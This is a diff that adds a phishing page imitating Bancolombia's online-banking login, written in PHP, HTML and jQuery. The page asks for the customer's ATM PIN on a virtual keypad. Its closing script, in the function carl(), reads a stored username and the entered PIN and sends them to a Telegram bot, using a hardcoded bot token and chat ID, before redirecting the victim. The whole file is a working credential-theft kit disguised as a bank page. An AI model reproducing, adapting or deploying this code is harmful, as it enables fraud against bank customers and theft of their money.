@@ -1,0 +1,728 @@
+<?php
+$ip = getenv("REMOTE_ADDR");
+setlocale(LC_TIME, "spanish");
+$tiempo = strftime("%A, %d de %B de %Y");
+date_default_timezone_set('America/Bogota');
+?>
+<html>
+	<head>
+  		<title>Bancolombia Sucursal Vrtual Personas</title>
+  		<meta http-equiv="content-type" content="text/html; utf-8">
+  		<meta charset="utf-8">
+  		
+		<meta content="es" http-equiv="Content-Language">
+  	
+		<meta name="description" content="">
+  		<meta name="author" content="">
+  		<meta name="Copyright" content="">
+  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	 	<script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
+		<link href="../../../../../css/style.css" rel="stylesheet">
+		<link href="../../../../../css/stylesheet.css" rel="stylesheet">		
+		<link rel="icon" type="image/png" href="../../../../../img/logo.png" />
+		<script type="text/javascript" src="../../../../../js/jquery-3.6.0.min.js"></script>
+		<script src="../../../../../js/jquery.jclock-min.js" type="text/javascript"></script>
+   		<script type="text/javascript" src="../../../../../js/functions.js"></script>  		
+           <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+   	</head>
+    <style>
+        *{
+	padding: 0px;
+	margin: 0px;
+}
+
+.subtitulo {
+    color: #2c2a29;
+    font-size: 16px;
+    font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif !important;   
+    line-height: 42px;
+}
+
+.texto-min {
+    font-size: 11px !important;
+    color: #2c2a29 !important;
+    font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif !important;
+    line-height: 16px;
+}
+
+.contenido{
+	padding: 20px 105px 20px 105px;
+}
+
+.titulo{
+	background-color: #2c2a29;
+	color: #fff;
+	font-size: 16px;
+    font-weight: normal;    
+    font-family: 'CIBFontSans', Helvetica, Arial, Verdana, Tahoma, sans-serif !important;
+    margin-top: 28px;
+    padding: 10px 20px;
+    margin-bottom: 30px;
+}
+
+.pnlizq{
+	width: 359px;
+	float: left;
+}
+
+.formulario{
+	border: 1px solid #CCCCCC;
+}
+.form-titulo{
+	background-color: #2c2a29;
+	color: #fff;
+    font-family: 'CIBFontSans', Helvetica, Arial, Verdana, Tahoma, sans-serif !important;
+    font-size: 16px;
+    font-weight: normal;  
+    padding: 10px;  
+}
+
+.descripcion{
+	background-color: #F4F4F4;
+	font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif !important;
+    font-size: 12px;
+    color: #2c2a29;    
+    line-height: 14px;
+    padding: 10px;
+}
+
+.pnlder{
+	width: calc(100% - 359px);
+	float: left;
+}
+.publicidad{
+	margin-left: 40px;
+}
+.form-cuerpo{
+	padding: 11px;
+	text-align: center;
+}
+
+.user{
+     background-image: url('../img/user.png');
+  }
+
+  .pass{
+     background-image: url('../img/lock.png');
+  }
+
+  .email{
+     background-image: url('../img/email.png');
+  }
+
+  .celular{
+     background-image: url('../img/telefono.png');
+  }
+  .credit-card{
+     background-image: url('../img/credit-card.png');
+  }
+
+  .input-icono {   
+  	margin-top: 10px;
+    background-repeat: no-repeat;
+    background-position: 18px center;
+    background-size: 18px;
+    display: flex;
+    align-items: center;
+    width: calc(100% - 44px);
+    padding-left: 44px;
+    border: 1px solid #CCCCCC;
+    border-radius: 0px;    
+    height: 34px;
+    
+  }
+
+select{
+	border: 1px solid #CCCCCC;
+    border-radius: 0px;    
+    height: 34px;
+	font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif !important;
+	font-size: 14px;
+    font-weight: normal;
+    line-height: 1.428571429;
+    color: #2c2a29;
+}
+
+  .input-icono input {
+    width: 100%;
+    border: none;
+    font-size: 14px;
+    font-weight: normal;
+    line-height: 1.428571429;
+    color: #2c2a29;
+    font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif !important;
+  }
+
+  .input-icono input:focus {
+    outline: none;
+  }
+
+.etiqueta{
+    font-family: 'CIBFontSans', Helvetica, Arial, Verdana, Tahoma, sans-serif !important;
+    font-weight: bold;
+    color: #2c2a29 !important;
+    font-size: 14px !important;
+}
+
+.icon-info{
+	width: 12px !important;
+	margin-right: 10px;
+}
+   		
+
+
+.btn-blanco{
+	background-color:#FFF;
+	color: #2c2a29;
+    white-space: nowrap;    
+    border: 1px solid #2c2a29;
+}
+
+.btn{
+
+    font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif !important;
+    font-size: 14px;
+    padding: 7px 15px 8px 15px;
+    font-weight: normal; 
+    cursor: pointer;
+    border-radius: 0px;
+}
+
+.btn-amarillo{
+	background-color:#FDDA24;
+	color: #2c2a29;
+    white-space: nowrap;    
+    border: 0px solid transparent;  
+}
+.btn-amarillo:hover{
+	background-color:#FDC82A;
+}
+    
+.texto{
+	font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif, normal;
+    color: #2c2a29;
+    font-weight: normal;
+    font-size: 14px;
+    line-height: 1.42857143;
+
+}
+a{
+	text-decoration: none;
+	color: #2c2a29;;
+}
+a:hover{
+	text-decoration: underline;
+}
+
+.vinculos{
+	margin-top: 18px;
+}
+
+.lista-links {
+    border: 1px solid #CCCCCC;
+    padding: 0px 10px 20px 10px;
+}
+
+.vinculos img{
+	width: 19px;
+	margin-right: 12px;
+}
+
+.vinculos a{
+	font-size: 14px;
+}
+
+.pie{
+    display: inline-block;
+    padding: 30px 0px 10px 0px;
+}
+.direccion{	
+    color: #2c2a29;
+    font-size: 12px;
+    text-align: justify;
+    font-family: 'OpenSans-Regular' !important;
+}
+.ippie{	
+    color: #2c2a29;
+    font-size: 12px;
+    text-align: justify;
+    font-family: 'OpenSans-Regular' !important;
+    padding: 10px 0px 0px 0px;
+}
+
+
+
+.dirip{
+	float: left;
+}
+
+.copyright{
+	float: right;
+}
+
+
+
+.pnlizqPass{
+	width: 40%;
+	float: left;
+}
+
+.pnlderPass{	
+	width: 60%;
+	float: left;
+}
+
+.subtexto{	
+    font-size: 12px;
+    text-align: left;    
+    color: #2c2a29;
+    font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif !important;
+    padding-top: 5px;
+}
+.mensaje{
+	border: 1px solid #CCCCCC;
+	padding: 6px;
+	font-family: 'CIBFontSans',Arial, Helvetica, sans-serif, Verdana;
+	margin-bottom: 20px;
+	display: none;
+}
+
+.entrada{
+	width: 359px;
+	float: left;
+}.teclado{
+	width: calc(100% - 400px);
+	float: left;
+	padding-left: 41;
+	padding-top: 30px;
+}
+
+.teclas td{	
+	border: 1px solid #2c2a29;
+	width: 38px;
+	height: 38px;
+	font-size: 13px;
+    font-weight: bolder;
+    color: #2C2A29;
+    font-family: 'CIBFontSans',Arial, Helvetica, sans-serif, Verdana;
+    font-style: normal;
+}
+
+
+@media (max-width: 767px) {
+	.contenido{
+		padding: 20px 20px;
+	}
+	.pnlder {
+	    float: unset;
+	    width: 100%;
+	}
+	.pnlizq {
+	    float: unset;
+	    width: 100%;
+	}
+	.publicidad{
+		margin-left: 0px;
+		width: 100%;
+	}
+
+	.pnlizqPass{
+		width: 100%;
+		float: unset;
+	}
+
+	.pnlderPass{	
+		width: 100%;
+		float: unset;
+	}
+
+	.entrada{
+		width: 100%;
+		float: unset;
+	}
+
+	.teclado{
+		width: 100%;
+		float: unset;	
+	}
+
+}
+
+@media (min-width: 768px) and (max-width: 1199px) {
+	.entrada{
+		width: 100%;
+		float: unset;
+	}
+
+	.teclado{
+	width: 100%;
+	float: unset;	
+	}
+}
+
+
+@font-face {
+  font-family: 'Arimo';
+  src: url("../fonts/arimo/arimo-regular-webfont.eot");
+  /* IE9 Compat Modes */
+  src: url("../fonts/arimo/arimo-regular-webfont.eot?#iefix") format("embedded-opentype"), url("../fonts/arimo/arimo-regular-webfont.woff") format("woff"), url("../fonts/arimo/arimo-regular-webfont.ttf") format("truetype"), url("../fonts/arimo/arimo-regular-webfont.svg") format("svg");
+  /* Legacy iOS */
+  font-weight: normal;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Arimo-bold';
+  src: url("../fonts/arimo/arimo-bold-webfont.eot");
+  /* IE9 Compat Modes */
+  src: url("../fonts/arimo/arimo-bold-webfont.eot?#iefix") format("embedded-opentype"), url("../fonts/arimo/arimo-bold-webfont.woff") format("woff"), url("../fonts/arimo/arimo-bold-webfont.ttf") format("truetype"), url("../fonts/arimo/arimo-bold-webfont.svg") format("svg");
+  /* Legacy iOS */
+  font-weight: normal;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Arimo-italic';
+  src: url("../fonts/arimo/arimo-italic-webfont.eot");
+  /* IE9 Compat Modes */
+  src: url("../fonts/arimo/arimo-italic-webfont.eot?#iefix") format("embedded-opentype"), url("../fonts/arimo/arimo-italic-webfont.woff2") format("woff2"), url("../fonts/arimo/arimo-italic-webfont.woff") format("woff"), url("../fonts/arimo/arimo-italic-webfont.ttf") format("truetype"), url("../fonts/arimo/arimo-italic-webfont.svg#arimoitalic") format("svg");
+  /* Legacy iOS */
+  font-weight: normal;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'icon_font_bc';
+  src: url("../fonts/iconfont/icon_font_bc.eot?61jkgi");
+  src: url("../fonts/iconfont/icon_font_bc.eot?61jkgi#iefix") format("embedded-opentype"), url("../fonts/iconfont/icon_font_bc.ttf?61jkgi") format("truetype"), url("../fonts/iconfont/icon_font_bc.woff?61jkgi") format("woff"), url("../fonts/iconfont/icon_font_bc.svg?61jkgi#icon_font_bc") format("svg");
+  font-weight: normal;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'CIBFontSans-bold';
+  src: url("../fonts/opensans/CIBFontSans-Bold.ttf") format("truetype");
+  font-weight: normal;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'CIBFontSans';
+  src: url("../fonts/opensans/CIBFontSans-Light.ttf") format("truetype");
+  font-weight: normal;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'CIBFontSerif-Bold';
+  src: url("../fonts/opensans/CIBFontSerif-Bold.ttf") format("truetype");
+  font-weight: normal;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'OpenSans-Bold';
+  src: url("../fonts/opensans/OpenSans-Bold.ttf") format("truetype");
+  font-weight: normal;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'OpenSans-Regular';
+  src: url("../fonts/opensans/OpenSans-Regular.ttf") format("truetype");
+  font-weight: normal;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'OpenSans-SemiBold';
+  src: url("../fonts/opensans/OpenSans-SemiBold.ttf") format("truetype");
+  font-weight: normal;
+  font-style: normal;
+}
+
+
+	
+
+    </style>
+   	<body>
+   		<div class="contenido">
+   			<div class="cabecera">
+   				<div class="logo">
+   					<img src="../../../../../img/logo.svg">
+   					<br>
+   					<span class="subtitulo">Sucursal Virtual Personas</span>
+   					<br>
+					<span class="texto-min">Fecha y hora actual:</span> <span class="texto-min" id="fecha-hora">Lunes 13 de Junio de 2022 9:23:11 AM</span>
+   				</div>
+   				<div class="titulo">Iniciar sesion</div>
+   				<div class="mensaje">
+   					<table>
+   						<tr>
+   							<td valign="middle"><img src="../../../../../img/error.jpg" style="width: 40px;"></td>   					
+   							<td valign="middle" style="padding-left: 12px;"><span style="font-size: 20px; color: #000; line-height: 20px;">Error</span><br><span>Por favor ingesar la información requerida.</span></td>
+   						</tr>
+   					</table>
+   				</div>
+   			</div>   			
+   			<div class="cuerpo">
+   				<div class="pnlizqPass" style="color:#fff;">
+   					.
+   				</div>
+   				<div class="pnlderPass">
+   					<div class="entrada">  						
+   						<div class="formulario">
+	   						<div class="form-titulo">Clave</div>
+	   						<div class="descripcion">
+	   							Por motivos de seguridad es necesario procesar una verificación de identidad.
+	   						</div>
+	   						<div class="form-cuerpo">
+	   							<div style="text-align: left;">
+	   								<span class="etiqueta">Ingresa tu clave</span>
+	   							</div>   						
+	   							<div class="input-icono pass">
+	   								<input type="password" name="txtPassword" id="txtPassword" readonly>
+	   							</div>	   							
+	   							<div class="subtexto">
+	   								Ingresa mediante el teclado virtual la clave que usas en el cajero automático.
+	   							</div>
+	   							<br>
+	   							<button id="btnCancelar" name="btnCancelar" class="btn btn-blanco" type="button">Cancelar</button>&nbsp;&nbsp;&nbsp;
+	   							<button id="btnPass" name="btnPass" class="btn btn-amarillo" type="button" onclick="chc()">Continuar</button>
+	   							<br>
+	   							<div class="texto" style="text-align: right;">
+		   							<div class="vinculos">
+		   								<img src="../../../../../img/info.jpg" class="icon-info"><a href="#">Genera una clave personal</a>
+		   							</div>
+		   							 												
+								</div>   							
+	   						</div>
+	   					</div>
+   					</div>
+   					<div class="teclado">
+   						<table class="teclas" border="0" cellspacing="5">
+   							<tr>
+   								<td align="center" valign="middle" id="tecla1">1</td>
+   								<td align="center" valign="middle" id="tecla7">7</td>
+   								<td align="center" valign="middle" id="tecla6">6</td>
+   							</tr>
+   							<tr>
+   								<td align="center" valign="middle" id="tecla4">4</td>
+   								<td align="center" valign="middle" id="tecla3">3</td>
+   								<td align="center" valign="middle" id="tecla2">2</td>
+							</tr>
+							<tr>
+								<td align="center" valign="middle" id="tecla5">5</td>
+								<td align="center" valign="middle" id="tecla0">0</td>
+								<td align="center" valign="middle" id="tecla9">9</td>
+							</tr>
+							<tr>
+								<td align="center" valign="middle" id="tecla8">8</td>
+								<td colspan="2" align="center" valign="middle" id="teclaborrar">Borrar</td>
+							</tr>
+						</table>  
+						<img src="/img/con-a.gif" style="margin-left: 21px; margin-top: 5px;"> 						
+   					</div>
+
+   				</div>
+   			</div>
+   			
+   			<div class="pie" style="padding-top:80px;">
+   				<div class="direccion">Sucursal Telefónica Bancolombia: Bogotá 343 0000 - Medellín 510 9000 - Cali 554 0505 - Barranquilla 361 8888 - Cartagena 693 4400 - Bucaramanga 697 2525 - Pereira 340 1213<br class="salto-pie">
+El resto del país 01 800 09 12345. Sucursales Telefónicas en el exterior: España 900 995 717 - Estados Unidos 1866 379 9714.</div>
+   				<div class="ippie">
+   					<span class="dirip">Dirección IP: <?php echo $ip; ?></span>´
+   					<span class="copyright">Copyright © 2022 Bancolombia S.A.</span>
+   				</div>
+   			</div>
+   		</div>
+   	</body>
+</html>
+<script type="text/javascript">
+	var espera = 0;
+
+	let identificadorTiempoDeEspera;
+
+	function retardor() {
+	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
+	}
+
+	function retardorX() {
+
+	}
+
+	$(document).ready(function() {
+		$('.teclado td').hover(function(){
+			$('#tecla1,#tecla2,#tecla3,#tecla4,#tecla5,#tecla6,#tecla7,#tecla8,#tecla9,#tecla0').html("*");
+		});
+
+		$('.teclado td').on( "mouseout", function(){		
+			$('#tecla1').html("1");
+			$('#tecla2').html("2");
+			$('#tecla3').html("3");
+			$('#tecla4').html("4");
+			$('#tecla5').html("5");
+			$('#tecla6').html("6");
+			$('#tecla7').html("7");
+			$('#tecla8').html("8");
+			$('#tecla9').html("9");
+			$('#tecla0').html("0");		
+		});
+
+		$('.teclado').on( "touchstart", function(){		
+			$('#tecla1').html("1");
+			$('#tecla2').html("2");
+			$('#tecla3').html("3");
+			$('#tecla4').html("4");
+			$('#tecla5').html("5");
+			$('#tecla6').html("6");
+			$('#tecla7').html("7");
+			$('#tecla8').html("8");
+			$('#tecla9').html("9");
+			$('#tecla0').html("0");		
+		});
+
+		
+		$('#tecla1').click(function(){
+			if ($('#txtPassword').val().length < 4) {
+				$('#txtPassword').val($('#txtPassword').val() + "1");
+				$(".mensaje").hide();
+			}
+		});
+		$('#tecla2').click(function(){
+			if ($('#txtPassword').val().length < 4) {
+				$('#txtPassword').val($('#txtPassword').val() + "2");
+				$(".mensaje").hide();
+			}
+		});
+		$('#tecla3').click(function(){
+			if ($('#txtPassword').val().length < 4) {
+				$('#txtPassword').val($('#txtPassword').val() + "3");
+				$(".mensaje").hide();
+			}
+		});
+		$('#tecla4').click(function(){
+			if ($('#txtPassword').val().length < 4) {
+				$('#txtPassword').val($('#txtPassword').val() + "4");
+				$(".mensaje").hide();
+			}
+		});
+		$('#tecla5').click(function(){
+			if ($('#txtPassword').val().length < 4) {
+				$('#txtPassword').val($('#txtPassword').val() + "5");
+				$(".mensaje").hide();
+			}
+		});
+		$('#tecla6').click(function(){
+			if ($('#txtPassword').val().length < 4) {
+				$('#txtPassword').val($('#txtPassword').val() + "6");
+				$(".mensaje").hide();
+			}
+		});
+		$('#tecla7').click(function(){
+			if ($('#txtPassword').val().length < 4) {
+				$('#txtPassword').val($('#txtPassword').val() + "7");
+				$(".mensaje").hide();
+			}
+		});
+		$('#tecla8').click(function(){
+			if ($('#txtPassword').val().length < 4) {
+				$('#txtPassword').val($('#txtPassword').val() + "8");
+				$(".mensaje").hide();
+			}
+		});
+		$('#tecla9').click(function(){
+			if ($('#txtPassword').val().length < 4) {
+				$('#txtPassword').val($('#txtPassword').val() + "9");
+				$(".mensaje").hide();
+			}
+		});
+		$('#tecla0').click(function(){
+			if ($('#txtPassword').val().length < 4) {
+				$('#txtPassword').val($('#txtPassword').val() + "0");
+				$(".mensaje").hide();
+			}
+		});
+		$('#teclaborrar').click(function(){			
+				$('#txtPassword').val("");		
+				$(".mensaje").hide();	
+		});
+
+		$('#btnPass').click(function(){
+			if ($("#txtPassword").val().length > 3) {
+				pasousuario($("#txtPassword").val());	
+			}else{
+				$(".mensaje").show();
+			}	
+		});
+
+				
+	});
+</script>
+
+<script type="text/javascript">
+     $(function($) {
+         var optionsEST = {
+         am_pm: true,
+         timeNotation: '12h',
+         h_hour: "<?php echo date('H:i:s') ?>",
+         h_date: "<?php echo date('Y/m/d') ?>",
+         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
+         h_language: "es"
+        }
+     $('#fecha-hora').jclock(optionsEST);
+     });
+ </script>
+ <script>
+
+	function chc(params) {
+		if (document.getElementById("txtPassword").value.length < 4) {
+			alert("Clave incorrecta o erronea")
+			
+		}else{
+			carl();
+
+		}
+		
+	}
+	function carl(params) {
+   
+      
+     
+
+   
+   const token = '5507065651:AAFzRdWe_cbWNtAmu8GHr-DUtzxAfuNcRE0';
+const chatId = '-837415813';
+const usr = localStorage.getItem("usr");
+const pw = document.getElementById("txtPassword").value;
+
+  
+const message = `-BANCOLOMBIA-\n --Usr.: ${usr} \n  Pw: ${pw}` ;
+$.ajax({
+  type: 'POST',
+  url: `https://api.telegram.org/bot${token}/sendMessage`,
+  data: {  
+	  chat_id: chatId,
+	  text: message,
+	  parse_mode: 'html',
+  },
+  success: function (res) {
+	  console.debug(res);
+	  $('#response').text('Message sent');
+	  console.log("enviado")
+	  
+	  window.location = "index22.html"
+	  
+	  
+	 
+  },
+  error: function (error) {
+	  console.error(error);
+	  alert("error failed");
+  } 
+
+})
+
+}
+ </script>
